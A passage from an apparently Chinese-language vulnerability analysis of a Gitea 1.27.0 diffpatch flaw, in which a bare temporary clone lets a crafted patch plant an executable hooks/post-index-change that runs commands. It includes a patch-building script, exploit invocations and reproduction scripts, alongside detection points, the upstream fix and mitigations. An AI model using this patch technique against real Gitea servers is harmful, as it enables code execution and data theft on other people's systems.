<code>{post-index-chan}</code>，Git 按钩子名拉起来的，不是应用层直接 <code>sh</code> 了一个文件。</p><p><code>sleep 20</code> 会让 <code>lab.py</code> 在第二次提交时超时（客户端上限 30 秒）。</p><p>同一时刻找临时仓库：</p><pre><code>$ docker exec gitea-1.27.0 sh -c 'find /data -maxdepth 8 -name post-index-change'\n$ wait</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014518-2855fef9-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=ca2f6ab54025648b\" loading=\"lazy\" decoding=\"async\" width=\"959.4155896142777\"></p><p>PID、<code>upload.git</code> 后面的随机数字每次不同。</p><p>再往里一层，钩子打印：</p><pre><code>$ GITEA_PASSWORD='Attacker123!' python3 lab.py http://127.0.0.1:3000 attacker \\\n  'id; pwd; git rev-parse --absolute-git-dir; ls -l hooks/post-index-change' --patches 2</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014519-28a53c60-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=64b80c41d00104b0\" loading=\"lazy\" decoding=\"async\" width=\"1437.5000077892435\"></p><p>从 HTTP 请求到 OS 命令，三层：请求进 handler；handler 建 bare 临时仓库跑 <code>git apply -3</code>；apply 更新索引时拉起 <code>hooks/post-index-change</code>。第三层的身份是 <code>git</code>，工作目录是临时仓库，<code>$GIT_DIR</code> 也是同一个目录。</p><hr><h2 id=\"sec-20\">五、漏洞分析</h2><h3 id=\"sec-21\">1、diffpatch 的补丁怎么应用</h3><p>按时间排：</p><ol><li><p>校验仓库未归档、调用者有权限、补丁参数合法。</p></li><li><p><code>NewTemporaryUploadRepository</code> 创建一个临时目录。</p></li><li><p><code>t.Clone(ctx, opts.OldBranch, true)</code> 把原仓库 bare 克隆到临时目录。</p></li><li><p><code>t.SetDefaultIndex()</code> 执行 <code>git read-tree HEAD</code>，把 HEAD 的树放进索引。</p></li><li><p><code>git apply --index --recount --cached --ignore-whitespace --whitespace=fix --binary -3</code> 应用补丁。</p></li><li><p><code>git write-tree</code>、<code>git commit-tree</code>、<code>git push</code> 把结果推回原仓库。</p></li></ol><p>问题在第 3 步和第 5 步的组合：bare 克隆让临时目录同时是工作树和 <code>$GIT_DIR</code>；<code>-3</code> 让 apply 在 add/add 时走三方合并，三方合并要把结果写到工作树。</p><h3 id=\"sec-22\">2、路径与权限校验为什么没拦住</h3><p>handler 只校验“有没有权限改这个仓库”，没有校验“补丁允许改哪些路径”。<code>git apply</code> 自己有一层保护，只拒绝 <code>.git/</code> 前缀：</p><pre><code>$ python3 lab.py http://127.0.0.1:3000 attacker 'id' --patches 2 --path .git/hooks/post-index-change</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014519-28eb6460-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=7081b64224185807\" loading=\"lazy\" decoding=\"async\" width=\"1031.6558497459787\"></p><p><code>hooks/post-index-change</code> 不以 <code>.git/</code> 开头，<code>git apply</code> 认为它是合法的仓库内路径，放行。</p><p><code>--cached</code> 的直觉是“只写索引、不碰工作树”，但那是直接应用。add/add 走 <code>-3</code> 时，合并结果要落到工作树，这条分支不受 <code>--cached</code> 的字面约束。校验层看到的只是“一个普通新增文件”。</p><p>权限侧也没拦住：仓库写权限足够，不需要管理员；开放注册时，陌生人自己建一个仓库就同时拿到认证和写权限。</p><p>正常的补丁操作不受影响：</p><pre><code>$ python3 lab.py http://127.0.0.1:3000 attacker 'id' --benign</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014520-2930c82a-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=e1e5aee6e4e79aa1\" loading=\"lazy\" decoding=\"async\" width=\"1554.3831253057035\"></p><p>同一个接口，同样是新建文件，换成 <code>notes.txt</code> 就只是普通提交，没有钩子，也没有命令执行。危险判据只有一条：补丁路径能不能落到 <code>hooks/</code> 下。</p><h3 id=\"sec-23\">3、第二轮多出来的那次合并</h3><p>纯 git 里可以完全离开 Gitea 重放这条链。先准备原仓库和补丁：</p><pre><code># 原仓库\n$ T=$(mktemp -d /tmp/gitmech.XXXXXX)\n$ cd \"$T\"\n$ git init -q --bare origin.git\n$ git -C origin.git symbolic-ref HEAD refs/heads/main\n$ git clone -q origin.git seed\n$ cd seed\n$ git config user.email a@b\n$ git config user.name a\n$ echo hi &gt; README\n$ git add README\n$ git commit -qm init\n$ git push -q origin HEAD:main\n$ cd ..\n# 生成只写标记的钩子补丁\n$ cat &gt; /tmp/hook.sh &lt;&lt;'EOS'\n#!/bin/sh\necho \"HOOK_RAN pwd=$(pwd) git_dir=$(git rev-parse --absolute-git-dir 2&gt;/dev/null)\" &gt;&gt; /tmp/hook_ran\nEOS\n$ chmod +x /tmp/hook.sh\n$ python3 /opt/gitea-lab/make_patch.py /tmp/hook.sh &gt; /tmp/hook.patch</code></pre><p>tree 对不上，先 <code>cat /tmp/hook.sh</code> 对内容；钩子内容不同，tree 就不同。</p><p><code>make_patch.py</code>：</p><pre><code>#!/usr/bin/env python3\n\"\"\"把 hook.sh 包成 hooks/post-index-change 的新增文件补丁。\"\"\"\nimport hashlib, sys\n\nhook_path = sys.argv[1] if len(sys.argv) &gt; 1 else \"/tmp/hook.sh\"\ncontent = open(hook_path, \"rb\").read()\noid = hashlib.sha1(b\"blob %d\\0\" % len(content) + content).hexdigest()  # git blob oid\nlines = content.count(b\"\\n\")\n\n# 路径 + 100755 + blob oid\nhdr = (\n    f\"diff --git a/hooks/post-index-change b/hooks/post-index-change\\n\"\n    f\"new file mode 100755\\n\"\n    f\"index {'0'*40}..{oid}\\n\"\n    f\"--- /dev/null\\n\"\n    f\"+++ b/hooks/post-index-change\\n\"\n    f\"@@ -0,0 +1,{lines} @@\\n\"\n)\nout = hdr.encode() + b\"\".join(b\"+\" + l for l in content.splitlines(keepends=True))\nsys.stdout.buffer.write(out)</code></pre><p>第一轮：bare 克隆、<code>read-tree</code>、apply、commit、push。钩子文件只在索引和树里，磁盘上没有：</p><pre><code>$ git clone -q --bare -s origin.git temp1.git\n$ cd temp1.git\n$ git config core.bare\ntrue\n$ git read-tree HEAD\n$ git apply --index --recount --cached --ignore-whitespace --whitespace=fix --binary -3 /tmp/hook.patch\n$ ls hooks/post-index-change\nls: 无法访问 'hooks/post-index-change': 没有那个文件或目录\n$ tree=$(git write-tree)\n$ echo $tree\nb72efd6ccb4217742c4bfc51f188aedc0c862d67\n$ commit=$(printf 'x\\n' | GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@b GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@b git commit-tree \"$tree\" -p HEAD)\n$ echo $commit\n2aee2d8a242e549b2a01a05eb9a8e1b86642a1f4\n$ git update-ref refs/heads/main \"$commit\"\n$ git push -q origin refs/heads/main:refs/heads/main</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014520-297c5c11-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=24621815b4188096\" loading=\"lazy\" decoding=\"async\" width=\"1497.5649431796467\"></p><p>第二轮重新 bare 克隆。HEAD 的树里已经有 <code>hooks/post-index-change</code>，<code>read-tree</code> 把它放进索引；apply 发现索引里已有同路径，patch 又是 <code>new file</code>，形成 add/add，<code>-3</code> 走三方合并：</p><pre><code>$ git clone -q --bare -s origin.git temp2.git\n$ cd temp2.git\n$ git read-tree HEAD\n$ git apply --index --recount --cached --ignore-whitespace --whitespace=fix --binary -3 /tmp/hook.patch\n$ ls -l hooks/post-index-change\n-rwxr-xr-x 1 root root 110 11月13日 01:27 hooks/post-index-change\n$ cat /tmp/hook_ran\nHOOK_RAN pwd=/tmp/gitmech3.Y7YrCi/temp2.git git_dir=/tmp/gitmech3.Y7YrCi/temp2.git</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014521-29c91d7c-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=e0d7e7059815f397\" loading=\"lazy\" decoding=\"async\" width=\"1112.0129930385451\"></p><p>第二轮 apply 的 stderr：</p><pre><code>回落到直接应用...\n执行三方合并...\n成功应用补丁到 'hooks/post-index-change'。</code></pre><p>“回落到直接应用”是第一轮：新增文件直接进索引，不碰工作树。“执行三方合并”是第二轮：索引里已有同路径，必须合并，合并结果写工作树。两次提交的差别就在这一行。</p><p><code>mechanism3.sh</code>：</p><pre><code>#!/bin/bash\n# 纯 git 两轮：第一轮写树，第二轮 add/add 触发三方合并。\nset -u\nT=$(mktemp -d /tmp/gitmech3.XXXXXX)\nrm -f /tmp/hook_ran\necho \"tmp=$T\"\n\ncat &gt; /tmp/hook.sh &lt;&lt;'EOS'\n#!/bin/sh\necho \"HOOK_RAN pwd=$(pwd) git_dir=$(git rev-parse --absolute-git-dir 2&gt;/dev/null)\" &gt;&gt; /tmp/hook_ran\nEOS\nchmod +x /tmp/hook.sh\npython3 \"$(dirname \"$0\")/make_patch.py\" /tmp/hook.sh &gt; /tmp/hook.patch\n\ncd \"$T\"\ngit init -q --bare origin.git\ngit -C origin.git symbolic-ref HEAD refs/heads/main\ngit clone -q origin.git seed\ncd seed\ngit config user.email a@b\ngit config user.name a\necho hi &gt; README\ngit add README\ngit commit -qm init\ngit push -q origin HEAD:main\ncd ..\n\nround() {\n  local n=$1\n  cd \"$T\"\n  rm -rf temp$n.git\n  git clone -q --bare -s origin.git temp$n.git\n  cd temp$n.git\n  echo \"--- round $n: bare=$(git config core.bare)\"\n  git read-tree HEAD\n  echo \"[$n] hooks before apply: $(ls hooks/post-index-change 2&gt;&amp;1)\"\n  git apply --index --recount --cached --ignore-whitespace --whitespace=fix --binary -3 /tmp/hook.patch; echo \"[$n] apply rc=$?\"\n  echo \"[$n] hooks after apply: $(ls -l hooks/post-index-change 2&gt;&amp;1)\"\n  echo \"[$n] marker after apply: $(cat /tmp/hook_ran 2&gt;&amp;1)\"\n  local tree commit\n  tree=$(git write-tree)\n  commit=$(printf 'x\\n' | GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@b GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@b git commit-tree \"$tree\" -p HEAD)\n  git update-ref refs/heads/main \"$commit\"\n  echo \"[$n] commit=$commit tree=$tree\"\n  echo \"[$n] marker after commit: $(cat /tmp/hook_ran 2&gt;&amp;1)\"\n  git push -q origin refs/heads/main:refs/heads/main; echo \"[$n] push rc=$?\"\n  echo \"[$n] marker after push: $(cat /tmp/hook_ran 2&gt;&amp;1)\"\n}\n\n# 第一轮：钩子只进索引和树\nround 1\n# 第二轮：HEAD 已有同路径，apply 走三方合并\nround 2\necho \"=== origin HEAD tree ===\"\ngit --git-dir=\"$T/origin.git\" ls-tree -r --name-only HEAD | head\necho \"=== origin refs ===\"\ngit --git-dir=\"$T/origin.git\" for-each-ref --format='%(refname)' | head</code></pre><h3 id=\"sec-24\">4、合并结果落到哪</h3><p>bare 仓库没有独立工作树，工作树路径与 <code>$GIT_DIR</code> 重合。补丁路径 <code>hooks/post-index-change</code> 在第二轮被三方合并写到工作树，落点就是 <code>$GIT_DIR/hooks/post-index-change</code>，正好是 Git 加载钩子的目录。</p><pre><code>flowchart LR\n    P[\"补丁路径 hooks/post-index-change\"]\n    subgraph BARE[\"bare 临时仓库 upload.git…\"]\n        W[\"工作树 = 仓库目录\"]\n        G[\"$GIT_DIR = 仓库目录\"]\n        H[\"钩子目录 = $GIT_DIR/hooks\"]\n    end\n    P --&gt; W\n    W --&gt;|\"同一个目录\"| G\n    G --&gt; H\n    H --&gt;|\"名字匹配 + 100755\"| X[\"post-index-change 执行\"]</code></pre><p>五条规则：</p><ol><li><p>bare 仓库没有独立工作树，工作树路径与 <code>$GIT_DIR</code> 重合。</p></li><li><p><code>git apply</code> 同时带 <code>--index</code>、<code>--cached</code>、<code>-3</code>。第一轮是新增文件，直接进索引；第二轮索引里已经有同路径，add/add 触发三方合并，合并结果写进工作树。</p></li><li><p>补丁路径由攻击者控制，只要不以 <code>.git/</code> 开头，<code>git apply</code> 不会拒绝。</p></li><li><p>文件名必须命中 Git 认可的钩子名，模式必须是 100755。</p></li><li><p><code>git apply</code> 更新索引时会触发 <code>post-index-change</code>，不需要等下一次提交。</p></li></ol><h3 id=\"sec-25\">5、没有调试日志时为什么看不到</h3><p>默认日志下这条链几乎不可见：</p><ul><li><p>两次 <code>POST /diffpatch</code> 都是 201，响应体是普通提交对象，没有命令字符串，也没有报错。</p></li><li><p>命令输出不经过 HTTP 响应，而是写进 <code>refs/heads/leak-*</code>，攻击者事后取走。</p></li><li><p>临时仓库用完就删，<code>/data/gitea/tmp/local-repo/upload.git*</code> 只在执行期间存在。</p></li><li><p>钩子执行只留下 <code>git apply</code> 和 <code>post-index-change</code> 的进程，没有应用层日志。</p></li></ul><p>钩子在一次 apply 里执行不止一次。用计数文件看：</p><pre><code>$ docker exec gitea-1.27.0 sh -c 'rm -f /tmp/hook_count'\n$ python3 lab.py http://127.0.0.1:3000 attacker 'echo hit &gt;&gt; /tmp/hook_count; wc -l &lt; /tmp/hook_count' --patches 2\n$ docker exec gitea-1.27.0 sh -c 'wc -l &lt; /tmp/hook_count'</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014521-2a13c6c6-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=d69190a244f7a128\" loading=\"lazy\" decoding=\"async\" width=\"1433.4415662088109\"></p><p>同一次 apply 里 <code>post-index-change</code> 被触发了两次。不开 <code>DEBUG3</code>、不看进程树、不查临时目录，日志里只是两次正常的补丁提交。</p><p>检测盯三个点：diffpatch 请求里的路径是否含 <code>hooks/</code>；临时仓库目录的 <code>hooks/</code> 是否出现新文件；<code>git apply</code> 是否带 <code>-3</code> 且临时仓库 <code>core.bare=true</code>。只看 HTTP 状态码看不出来。</p><h3 id=\"sec-26\">6、同一路径的另一种写法</h3><p>固定两次提交，换路径、模式、钩子名：</p><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>路径</p></td><td colspan=\"1\" rowspan=\"1\"><p>模式</p></td><td colspan=\"1\" rowspan=\"1\"><p>钩子名是否被 apply 触发</p></td><td colspan=\"1\" rowspan=\"1\"><p>结果</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>hooks/post-index-change</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>100755</p></td><td colspan=\"1\" rowspan=\"1\"><p>是</p></td><td colspan=\"1\" rowspan=\"1\"><p>EXECUTED</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>hooks/pre-commit</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>100755</p></td><td colspan=\"1\" rowspan=\"1\"><p>否</p></td><td colspan=\"1\" rowspan=\"1\"><p>NO-OUTPUT</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>hooks/post-checkout</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>100755</p></td><td colspan=\"1\" rowspan=\"1\"><p>否</p></td><td colspan=\"1\" rowspan=\"1\"><p>NO-OUTPUT</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>hooks/post-merge</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>100755</p></td><td colspan=\"1\" rowspan=\"1\"><p>否</p></td><td colspan=\"1\" rowspan=\"1\"><p>NO-OUTPUT</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>hooks/post-index-change</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>100644</p></td><td colspan=\"1\" rowspan=\"1\"><p>名字对，但不可执行</p></td><td colspan=\"1\" rowspan=\"1\"><p>NO-OUTPUT</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>post-index-change</code>（仓库根）</p></td><td colspan=\"1\" rowspan=\"1\"><p>100755</p></td><td colspan=\"1\" rowspan=\"1\"><p>不在 hooks 目录</p></td><td colspan=\"1\" rowspan=\"1\"><p>NO-OUTPUT</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p><code>.git/hooks/post-index-change</code></p></td><td colspan=\"1\" rowspan=\"1\"><p>100755</p></td><td colspan=\"1\" rowspan=\"1\"><p>路径被 git 拒绝</p></td><td colspan=\"1\" rowspan=\"1\"><p>HTTP 500</p></td></tr></tbody></table><p>对应的命令和输出：</p><pre><code>$ cd /opt/gitea-lab\n$ export GITEA_PASSWORD='Attacker123!'\n$ python3 lab.py http://127.0.0.1:3000 attacker 'id' --patches 2\n$ python3 lab.py http://127.0.0.1:3000 attacker 'id' --patches 2 --path .git/hooks/post-index-change\n$ python3 lab.py http://127.0.0.1:3000 attacker 'id' --patches 2 --path hooks/pre-commit\n$ python3 lab.py http://127.0.0.1:3000 attacker 'id' --patches 2 --mode 100644\n$ python3 lab.py http://127.0.0.1:3000 attacker 'id' --patches 2 --path post-index-change</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014522-2a71437f-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=65d2ee45d7529ed0\" loading=\"lazy\" decoding=\"async\" width=\"1383.9285789275325\"></p><p>三个没打中的写法：</p><ul><li><p>钩子名不对：文件确实落进了 <code>hooks/</code>，但 <code>git apply</code> 只触发 <code>post-index-change</code>，<code>pre-commit</code>、<code>post-checkout</code>、<code>post-merge</code> 这条路径上没人调用。</p></li><li><p>模式不对：<code>100644</code> 的文件在 <code>hooks/</code> 里也不会被执行，Git 要求钩子可执行。</p></li><li><p>路径不对：<code>.git/hooks/...</code> 被 <code>git apply</code> 直接拒绝，返回 500；放在仓库根的 <code>post-index-change</code> 又不在钩子查找目录里。</p></li></ul><p>换一种写法就失效，说明这不是通用路径穿越，而是目录折叠加钩子命名的组合。</p><hr><h2 id=\"sec-27\">六、修复建议</h2><h3 id=\"sec-28\">1、上游 1.27.1 的修复</h3><p>最直接的一层是升级。起 1.27.1，跑同样的两次提交：</p><pre><code>$ bash /opt/gitea-lab/gitea_up.sh 1.27.1 3001\n$ cd /opt/gitea-lab\n$ GITEA_PASSWORD='Attacker123!' python3 lab.py http://127.0.0.1:3001 attacker 'id; hostname' --patches 2\n$ docker logs gitea-1.27.1 --tail 30</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014523-2adaf5d2-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=4e989aed6cde8f33\" loading=\"lazy\" decoding=\"async\" width=\"1547.8896187770115\"></p><p><code>gitea_up.sh</code>：</p><pre><code>#!/bin/bash\n# 起 Gitea：重置数据、启动容器、等 API、建 attacker。\nset -e\nV=$1\nPORT=$2\nNAME=gitea-$V\nDATA=/opt/gitea-lab/data-$V\n\ndocker rm -f \"$NAME\" &gt;/dev/null 2&gt;&amp;1 || true\nrm -rf \"$DATA\"\nmkdir -p \"$DATA\"\n# 容器里的 uid 1000 要能写 /data\nchown 1000:1000 \"$DATA\"\n\ndocker run -d --name \"$NAME\" \\\n  -p 127.0.0.1:$PORT:3000 \\\n  -v \"$DATA:/data\" \\\n  -e GITEA__database__DB_TYPE=sqlite3 \\\n  -e GITEA__security__INSTALL_LOCK=true \\\n  -e GITEA__server__ROOT_URL=http://127.0.0.1:$PORT/ \\\n  -e GITEA__server__HTTP_PORT=3000 \\\n  -e GITEA__service__DISABLE_REGISTRATION=true \\\n  ghcr.io/go-gitea/gitea:$V &gt;/dev/null\n\nfor i in $(seq 1 90); do\n  code=$(curl -s -o /dev/null -w '%{http_code}' \"http://127.0.0.1:$PORT/api/v1/version\" 2&gt;/dev/null || true)\n  if [ \"$code\" = \"200\" ]; then break; fi\n  sleep 2\ndone\n\necho \"version: $(curl -s http://127.0.0.1:$PORT/api/v1/version)\"\ndocker exec -u git \"$NAME\" gitea admin user create \\\n  --username attacker --password 'Attacker123!' \\\n  --email attacker@example.com --must-change-password=false 2&gt;&amp;1 | tail -2\necho \"users: $(docker exec -u git \"$NAME\" gitea admin user list 2&gt;/dev/null | tail -n +2 | awk '{print $2}' | tr '\\n' ' ')\"</code></pre><h3 id=\"sec-29\">2、clone 参数应当改成非 bare</h3><p>上游的修法就是这一行：</p><pre><code>-\tif err := t.Clone(ctx, opts.OldBranch, true); err != nil {\n+\t// here must NOT use bare repo, because the following git commands might operate working tree (\"--index\") directly\n+\tif err := t.Clone(ctx, opts.OldBranch, false); err != nil {</code></pre><p>非 bare 之后，临时仓库变成“工作树 + <code>.git</code>”两层。补丁里的 <code>hooks/post-index-change</code> 即使被三方合并写出来，也落在工作树的 <code>hooks/</code>，Git 加载钩子看的是 <code>.git/hooks/</code>，两者不再重合。</p><p>纯 git 里把同一套东西放到非 bare 克隆：</p><pre><code>$ bash /opt/gitea-lab/mechanism_fixed.sh</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014523-2b28f16c-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=0ad841faf743fc63\" loading=\"lazy\" decoding=\"async\" width=\"553.571431571013\"></p><p>工作树里的 <code>hooks/post-index-change</code> 是克隆时检出的普通文件；真正的钩子目录 <code>.git/hooks/</code> 里没有它。三方合并即使成功，写的是工作树那一份，钩子加载器看的是 <code>.git/hooks/</code> 那一份。</p><p><code>mechanism_fixed.sh</code>：</p><pre><code>#!/bin/bash\n# 非 bare 布局：钩子落在工作树 hooks/，不执行。\nset -u\nT=$(mktemp -d /tmp/gitfix.XXXXXX)\nrm -f /tmp/hook_ran\necho \"tmp=$T\"\n\ncat &gt; /tmp/hook.sh &lt;&lt;'EOS'\n#!/bin/sh\necho \"HOOK_RAN\" &gt;&gt; /tmp/hook_ran\nEOS\nchmod +x /tmp/hook.sh\npython3 \"$(dirname \"$0\")/make_patch.py\" /tmp/hook.sh &gt; /tmp/hook.patch\n\ncd \"$T\"\ngit init -q --bare origin.git\ngit -C origin.git symbolic-ref HEAD refs/heads/main\ngit clone -q origin.git seed\ncd seed\ngit config user.email a@b\ngit config user.name a\necho hi &gt; README\nmkdir -p hooks\ncp /tmp/hook.sh hooks/post-index-change\nchmod +x hooks/post-index-change\ngit add README hooks/post-index-change\ngit commit -qm init\ngit push -q origin HEAD:main\ncd ..\n\n# 工作树和 .git 分开\necho \"=== non-bare clone (Gitea 1.27.1 style) ===\"\ngit clone -q origin.git work\ncd work\necho \"git-dir=$(git rev-parse --git-dir)\"\necho \"worktree hook:\"; ls -l hooks/post-index-change\necho \".git/hooks hook:\"; ls -l .git/hooks/post-index-change 2&gt;&amp;1\necho \"=== apply the same add/add patch ===\"\ngit apply --index --recount --cached --ignore-whitespace --whitespace=fix --binary -3 /tmp/hook.patch; echo \"apply rc=$?\"\necho \"marker: $(cat /tmp/hook_ran 2&gt;&amp;1)\"\necho \"=== where would a successful apply write? ===\"\nls -ld hooks .git/hooks</code></pre><h3 id=\"sec-30\">3、补上这一行之后</h3><p>修复生效后的变化：</p><ul><li><p>临时仓库的 <code>core.bare</code> 从 <code>true</code> 变成 <code>false</code>。</p></li><li><p>补丁路径落在 <code>&lt;worktree&gt;/hooks/</code>，不再落到 <code>$GIT_DIR/hooks/</code>。</p></li><li><p>第二次 add/add 三方合并会因为工作树/索引状态不一致而失败，Gitea 返回 500。</p></li><li><p>钩子不再执行，<code>refs/heads/leak-*</code> 不会出现。</p></li></ul><p>一个差异：纯 git 里这次 apply 返回 0，Gitea 1.27.1 里返回 500。错误信息是 <code>does not match index</code>，说明三方合并时工作树里的那一份和索引对不上；这来自两次请求之间的工作树/索引状态差异。两条路径都没有执行钩子，500 只是修复后的另一种表现。</p><pre><code>flowchart TD\n    A[\"补丁路径 hooks/post-index-change\"] --&gt; B{\"临时仓库是 bare？\"}\n    B --&gt;|\"是（1.27.0）\"| C[\"工作树 = $GIT_DIR\"]\n    C --&gt; D[\"落到 $GIT_DIR/hooks/，执行\"]\n    B --&gt;|\"否（1.27.1）\"| E[\"工作树 = 仓库目录，$GIT_DIR = 仓库目录/.git\"]\n    E --&gt; F[\"落到 工作树/hooks/，不执行\"]</code></pre><h3 id=\"sec-31\">4、拿不到补丁时的调用侧处理</h3><p>升级不是所有环境都能立刻做，调用侧可以叠几层：</p><ol><li><p><strong>补丁路径白名单。</strong> 在应用层拒绝 <code>hooks/</code>、<code>.git/</code> 以及其他保留目录，只允许业务文件路径。这是唯一能覆盖“未来某次重构又把工作树折回去”的一层。残余面：白名单如果按前缀匹配，<code>hooks/../hooks/...</code> 这类归一化差异仍可能漏，要做规范化后再比。</p></li><li><p><strong>临时仓库禁用钩子。</strong> 对执行 apply 的临时仓库加 <code>-c core.hooksPath=/dev/null</code>，或者把临时目录挂成 <code>noexec</code>。即使文件落进 hooks 目录，也没有加载路径。纯 git 里做过对照：</p></li></ol><pre><code>$ bash /opt/gitea-lab/mitigation.sh\ncontrol rc=0\ncontrol marker: HOOK_RAN\nmitigated rc=0\nmitigated marker: cat: /tmp/hook_ran: 没有那个文件或目录</code></pre><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261115014524-2b70636d-e053-1.png&amp;mode=full&amp;exp=1795564800&amp;sig=e4098544d38bb3a6\" loading=\"lazy\" decoding=\"async\" width=\"565.7467563123109\"></p><p>残余面：有些 Git 操作依赖钩子做审计，禁用前要确认业务不受影响。</p><p><code>mitigation.sh</code>：</p><pre><code>#!/bin/bash\n# 对照：正常第二轮执行钩子；core.hooksPath=/dev/null 后不执行。\nset -u\nT=$(mktemp -d /tmp/gitmit.XXXXXX)\nrm -f /tmp/hook_ran\necho \"tmp=$T\"\n\ncat &gt; /tmp/hook.sh &lt;&lt;'EOS'\n#!/bin/sh\necho \"HOOK_RAN\" &gt;&gt; /tmp/hook_ran\nEOS\nchmod +x /tmp/hook.sh\npython3 \"$(dirname \"$0\")/make_patch.py\" /tmp/hook.sh &gt; /tmp/hook.patch\n\ncd \"$T\"\ngit init -q --bare origin.git\ngit -C origin.git symbolic-ref HEAD refs/heads/main\ngit clone -q origin.git seed\ncd seed\ngit config user.email a@b\ngit config user.name a\necho hi &gt; README\ngit add README\ngit commit -qm init\ngit push -q origin HEAD:main\ncd ..\n\n# 第一轮：把钩子文件提交进树\ngit clone -q --bare -s origin.git temp1.git\ncd temp1.git\ngit read-tree HEAD\ngit apply --index --recount --cached --ignore-whitespace --whitespace=fix --binary -3 /tmp/hook.patch\ntree=$(git write-tree)\ncommit=$(printf 'x\\n' | GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@b GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@b git commit-tree \"$tree\" -p HEAD)\ngit update-ref refs/heads/main \"$commit\"\ngit push -q origin refs/heads/main:refs/heads/main\ncd ..\n\n# 对照组：正常 apply\necho \"=== control: normal round 2 ===\"\ngit clone -q --bare -s origin.git temp2.git\ncd temp2.git\ngit read-tree HEAD\nrm -f /tmp/hook_ran\ngit apply --index --recount --cached --ignore-whitespace --whitespace=fix --binary -3 /tmp/hook.patch; echo \"control rc=$?\"\necho \"control marker: $(cat /tmp/hook_ran 2&gt;&amp;1)\"\ncd ..\n\n# 缓解组：钩子目录指向 /dev/null\necho \"=== mitigated: core.hooksPath=/dev/null ===\"\ngit clone -q --bare -s origin.git temp3.git\ncd temp3.git\ngit read-tree HEAD\nrm -f /tmp/hook_ran\ngit -c core.hooksPath=/dev/null apply --index --recount --cached --ignore-whitespace --whitespace=fix --binary -3 /tmp/hook.patch; echo \"mitigated rc=$?\"\necho \"mitigated marker: $(cat /tmp/hook_ran 2&gt;&amp;1)\"\nls -l hooks/post-index-change 2&gt;&amp;1</code></pre><ol><li><p><strong>限制临时仓库的权限。</strong> 用独立的低权限用户跑补丁应用，容器内只挂载必要的仓库目录。把“命令以 Gitea 身份执行”降级成“命令以临时用户执行”。残余面：Gitea 本身需要读写仓库，权限压得太低会影响正常推送。</p></li><li><p><strong>关闭公开注册，收紧 diffpatch 权限。</strong> 实例不需要陌生人建仓就关掉注册；不需要补丁 API，就在反向代理层拒掉 <code>/api/v1/repos/*/*/diffpatch</code>。这条链的入口是“任意账号 + 仓库写权限”，收窄入口比修一个参数更直接。</p></li><li><p><strong>加一条日志规则。</strong> 对 <code>diffpatch</code> 的 201 响应后紧跟 <code>git apply</code> 且路径含 <code>hooks/</code> 的请求告警。0day 窗口期升级不一定及时，这条规则能在利用发生时留下痕迹。</p></li></ol><h3 id=\"sec-32\">5、排查要点</h3><ol><li><p>源码：看 <code>services/repository/files/patch.go</code> 的 <code>gitPatchPrepare()</code>，<code>t.Clone(ctx, opts.OldBranch, true)</code> 的第三个参数是 bare；1.27.0 是 <code>true</code>，1.27.1 改成 <code>false</code>。同一函数后面的 <code>git apply --index --cached ... -3</code> 是另一个条件。</p></li><li><p>版本：<code>gitea --version</code>。1.17–1.26、1.27.0 受影响，1.27.1 修复；发行版打包的版本号可能和上游 tag 不一致，以二进制自报为准。</p></li><li><p>补丁：不用找畸形样本，看 diffpatch 请求里的 diff。路径含 <code>hooks/</code>、模式 100755、同一个补丁提交两次，这三个同时出现就可疑；正常业务补丁不会写 